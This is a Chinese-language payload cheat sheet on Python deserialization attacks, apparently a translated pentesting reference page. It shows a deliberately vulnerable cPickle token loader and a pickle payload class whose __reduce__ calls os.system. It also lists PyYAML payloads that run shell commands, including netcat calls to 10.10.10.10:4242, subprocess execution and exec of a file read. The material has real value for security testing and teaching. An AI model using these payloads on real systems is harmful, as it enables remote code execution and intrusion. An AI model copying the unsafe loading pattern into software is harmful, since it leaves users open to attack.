[原文文档](Python.en.md)

# Python 反序列化

> Python 反序列化是从序列化数据（通常使用 JSON、pickle 或 YAML 等格式）重建 Python 对象的过程。pickle 模块是 Python 中经常用于此目的的工具，因为它可以序列化和反序列化复杂的 Python 对象，包括自定义类。

## 摘要

* [工具](#工具)
* [方法论](#方法论)
    * [Pickle](#pickle)
    * [PyYAML](#pyyaml)
* [参考资料](#参考资料)

## 工具

* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - 用于对使用 pickle、PyYAML、ruamel.yaml 或 jsonpickle 模块进行序列化数据反序列化的 Python 驱动应用程序进行反序列化 RCE 攻击的序列化有效载荷。

## 方法论

在 Python 源代码中，查找这些接收器：

* `cPickle.loads`
* `pickle.loads`
* `_pickle.loads`
* `jsonpickle.decode`

### Pickle

以下代码是使用 `cPickle` 生成身份验证令牌的简单示例，该令牌是序列化的 User 对象。
:警告: `import cPickle` 仅在 Python 2 上工作

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("您的身份验证令牌 : {}").format(auth_token)
```

当从用户输入加载令牌时，会引入漏洞。

```python
new_token = raw_input("新身份验证令牌 : ")
token = cPickle.loads(b64decode(new_token))
print "欢迎 {}".format(token.username)
```

Python 2.7 文档明确指出，Pickle 绝不应与不受信任的源一起使用。让我们创建将在服务器上执行任意代码的恶意数据。

> pickle 模块对错误或恶意构造的数据不安全。永远不要从不受信任或未经验证的源反序列化数据。

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("您的恶意令牌 : {}").format(evil_token)
```

### PyYAML

YAML 反序列化是将 YAML 格式的数据转换回 Python、Ruby 或 Java 等编程语言中的对象的过程。YAML（YAML 不是标记语言）因其人类可读性并支持复杂的数据结构而常用于配置文件和数据交换。

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

从 PyYaml 版本 6.0 开始，`load` 的默认加载器已切换为 SafeLoader，降低了远程代码执行的风险。[PR #420 - 修复](https://github.com/yaml/pyyaml/issues/420)

现在易受攻击的接收器是 `yaml.unsafe_load` 和 `yaml.load(input, Loader=yaml.UnsafeLoader)`。

```py
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)
```

## 参考资料

* [CVE-2019-20477 - PyYAML 版本 <= 5.1.2 上的 0Day YAML 反序列化攻击 - Manmeet Singh (@_j0lt) - 2020 年 6 月 21 日](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
* [利用 Python 的 "pickle" 的滥用 - Nelson Elhage - 2011 年 3 月 20 日](https://blog.nelhage.com/2011/03/exploiting-pickle/)
* [Python Yaml 反序列化 - HackTricks - 2024 年 7 月 19 日](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
* [PyYAML 文档 - PyYAML - 2006 年 4 月 29 日](https://pyyaml.org/wiki/PyYAMLDocumentation)
* [Python 中的 YAML 反序列化攻击 - Manmeet Singh & Ashish Kukret - 2021 年 11 月 13 日](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)